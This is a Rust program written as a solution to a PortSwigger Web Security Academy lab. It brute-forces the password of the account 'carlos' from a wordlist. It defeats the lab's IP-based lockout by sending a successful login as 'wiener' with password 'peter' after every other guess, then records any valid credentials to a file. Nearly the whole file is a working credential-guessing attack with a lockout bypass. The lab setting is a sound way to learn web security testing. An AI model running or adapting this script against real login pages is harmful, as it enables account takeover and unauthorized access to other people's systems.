/****************************************************************
*
* Author: Ahmed Elqalawy (@elqal3awii)
*
* Date: 27/8/2023
*
* Lab: Broken brute-force protection, IP block
*
* Steps: 1. Brute force carlos password
*        2. After every try, login with correct
*           credentials to bypass blocking
*
*****************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use lazy_static::lazy_static;
use reqwest::{
    blocking::{Client, ClientBuilder},
    redirect::Policy,
};
use std::{
    collections::HashMap,
    fs::{self, OpenOptions},
    io::{self, Write},
    ops::Add,
    rc::Rc,
    sync::{
        atomic::{AtomicUsize, Ordering},
        Mutex,
    },
    thread,
    time::{self, Duration, Instant},
};
use text_colorizer::Colorize;

/******************
* Global variables
*******************/
lazy_static! {
    static ref FAILED_PASSWORDS: Mutex<Vec<String>> = Mutex::new(Vec::new());
    static ref PASSWORDS_COUNTER: AtomicUsize = AtomicUsize::new(0);
    static ref FAILED_PASSWORDS_COUNTER: AtomicUsize = AtomicUsize::new(0);
}

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0a1b00e4045d76eb8237443600e900d8.web-security-academy.net/login";

    // build the client that will be used for all subsequent requests
    let client = build_client();

    // read passwords as one big string
    // change the path of your passwords list
    let passwords = fs::read_to_string("/home/ahmed/passwords").unwrap();

    // capture the time before enumeration
    let start_time = time::Instant::now();

    // set valid user
    let valid_user = "carlos";

    // brute force his password
    let valid_password = brute_force_password(start_time, url, client, "carlos", passwords);

    // if you found a valid password
    match valid_password {
        Some(password) => {
            // print valid credential
            print_valid_credentials("carlos", &password);

            // save results  to a file in the current working directory
            // you can change this name to what you want
            save_results(start_time, "results", "carlos", &password);
        }
        None => {
            // save results  to a file in the current working directory
            save_results(start_time, "results", "carlos", "");

            println!("{}", "[!] Couldn't find valid password".red());
        }
    }

    print_finish_message(start_time);

    // some request will be failed due to unknow reseaon
    // print them after you finish to try them later
    print_failed_requests();
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

/***********************************************************************
* Function used to brute force passwords
* Parameters:
    - Instant: to ouptut an updated elapsed time to the terminal
    - URL: the URL of the lab
    - client: the client we build using the build_client() function
    - passwords: the list of gathered usernames
    - valid user: the valid user to brute force his password
************************************************************************/
fn brute_force_password(
    start_time: Instant,
    url: &str,
    client: Client,
    valid_user: &str,
    passwords: String,
) -> Option<String> {
    println!("[#] Brute forcing password..");
    println!(
        "{}: {}",
        "✅ Valid user: ".white().bold(),
        "carlos".green().bold()
    );

    // total number of passwords to try
    let total_counts = passwords.lines().count();

    // iterate over the whole list of passwords
    for (index, password) in passwords.lines().enumerate() {
        // update the success counter
        let success_counter = PASSWORDS_COUNTER.fetch_add(1, Ordering::Relaxed);

        // get the fail counter value
        let fail_counter = FAILED_PASSWORDS_COUNTER.fetch_add(0, Ordering::Relaxed);

        // calculate the elapsed time in minutes
        let elapsed_time = start_time.elapsed().as_secs() / 60;

        // make one successful login after every one try failed
        if index % 2 == 0 {
            // login as wiener to make a successfull login
            let login_as_wiener = client
                .post(url)
                .form(&HashMap::from([
                    ("username", "wiener"),
                    ("password", "peter"),
                ]))
                .send();

            // if loggin request succeeded
            if let Ok(res) = login_as_wiener {
                // if a redirection happened which means the login is successful
                if res.status().as_u16() == 302 {
                    println!("\n{}", "Send correct creds.. OK".blue().bold())
                } else {
                    println!("\n{}", "[!] Failed to Send correct creds".red().bold());
                }
            } else {
                println!(
                    "\n{}",
                    "[!] Failed to Send correct creds for unknown reason"
                        .red()
                        .bold()
                );
            }
        }

        // print some useful information
        print_progress(
            elapsed_time,
            fail_counter,
            success_counter,
            total_counts,
            password,
        );

        // the POST data to send
        let data = HashMap::from([("username", valid_user), ("password", password)]);

        // try to login_as_carlos
        let mut login_as_carlos = client.post(url).form(&data).send();

        // if the request succeeded
        if let Ok(res) = login_as_carlos {
            // if a redirection happens ( correct password )
            if res.status().as_u16() == 302 {
                println!("");

                // return the valid password
                return Some(password.to_string());
            }
        } else {
            // if the request failed, try to send it again
            login_as_carlos = client.post(url).form(&data).send();
            if let Ok(res) = login_as_carlos {
                if res.status().as_u16() == 302 {
                    println!("");
                    return Some(password.to_string());
                }
            } else {
                // if the repeated request also failed,
                // upate the counter and save the password to try it later
                FAILED_PASSWORDS_COUNTER.fetch_add(1, Ordering::Relaxed);
                FAILED_PASSWORDS.lock().unwrap().push(password.to_string());
            }
        }
    }
    println!("");
    None
}

/***************************************
* Function used to print the update info
* to the terminal in a nice format
****************************************/
#[inline(always)]
fn print_progress(
    elapsed_time: u64,
    fail_counter: usize,
    success_counter: usize,
    total_counts: usize,
    text: &str,
) {
    print!(
        "\r{}: {:3} minutes || {}: {:3} || {} ({}/{}): {:50}",
        "Elapsed".yellow().bold(),
        elapsed_time,
        "Failed".red().bold(),
        fail_counter,
        "Trying".white().bold(),
        success_counter,
        total_counts,
        text.blue().bold()
    );
    io::stdout().flush().unwrap();
}

/********************************************************
* Function used to print the valid username and password
*********************************************************/
#[inline(always)]
fn print_valid_credentials(valid_user: &str, valid_password: &str) {
    println!(
        "\n{}: username: {}, password: {}",
        "✅ Login successfully".white(),
        valid_user.green().bold(),
        valid_password.green().bold()
    );
}

/****************************************************
* Function used to print finish time
*****************************************************/
#[inline(always)]
fn print_finish_message(start_time: Instant) {
    println!(
        "\n{}: {:?} minutes",
        "✅ Finished in".green().bold(),
        start_time.elapsed().as_secs() / 60
    );
}

/****************************************************
* Function used to print failed usernames and password
* that we tried 2 times earlier and also failed
*****************************************************/
#[inline(always)]
fn print_failed_requests() {
    let failed_passwords = FAILED_PASSWORDS.lock().unwrap();
    println!(
        "\n\n{}: {} \n{}: {:?}",
        "[!] Failed password count".red().bold(),
        failed_passwords.len().to_string().yellow().bold(),
        "[!] Failed password ".red().bold(),
        failed_passwords
    )
}

/*********************************************
* Function used to save results to a txt file
**********************************************/
fn save_results(start_time: Instant, file_name: &str, valid_user: &str, valid_password: &str) {
    let failed_passwords = FAILED_PASSWORDS.lock().unwrap();
    let to_save = format!(
        "✅ Finished in: {elapsed_time:?} minutes \n\n\
    Username: {user}, Password: {pass} \n\n\
    [!] Failed passwords count: {fpasswords_count} \n\
    [!] Failed passwords: {fpasswords:?} \n\n",
        elapsed_time = start_time.elapsed().as_secs() / 60,
        fpasswords = failed_passwords,
        fpasswords_count = failed_passwords.len(),
        user = valid_user,
        pass = valid_password
    );
    let new_file = fs::File::create(file_name);
    if let Ok(mut file_created) = new_file {
        write!(file_created, "{}", to_save);
        println!(
            "\n{}: {}",
            "Restults was saved to".yellow().bold(),
            file_name.green().bold()
        )
    } else {
        println!("\n{}", "[!] Couldn't create new file to save results".red());
    }
}
